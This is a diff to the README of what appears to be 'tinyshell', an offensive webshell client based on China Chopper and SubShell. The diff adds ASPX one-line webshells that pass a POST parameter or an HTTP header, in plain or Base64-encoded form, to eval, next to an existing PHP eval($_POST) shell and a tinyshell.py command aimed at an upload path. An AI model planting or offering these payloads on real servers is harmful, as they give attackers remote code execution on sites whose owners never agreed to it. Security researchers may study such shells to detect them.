@@ -2,7 +2,7 @@
 
 ## New idea based on 
 
- - SubShell webshell framework
+ - SubShell webshell framework (https://bitbucket.org/jvest/subshell)
  - China Chopper Webshell (https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)
 
 ## Major Changes
@@ -49,11 +49,21 @@ python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --languag
 <?php @eval($_POST['password']);?>
 ```
 
+ ```aspx
+ <%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>
+
+ ```
+
 # Base64 Encoded POST parameter
 
 ```php
 <?php @eval(base64_decode($_POST['password']));?>
 ```
+
+ ```aspx
+ <%@ Page Language="Jscript"%><%eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["password"])),"unsafe");%>
+
+ ```
 
 # Base64 Encoded HEADER parameter
 
@@ -62,6 +72,7 @@ python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --languag
 
 ```
 
- ```aspx
- <%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>
- ```
+```aspx
+ <%@ Page Language="Jscript"%><%eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Headers["password"])),"unsafe");%>
+```
+
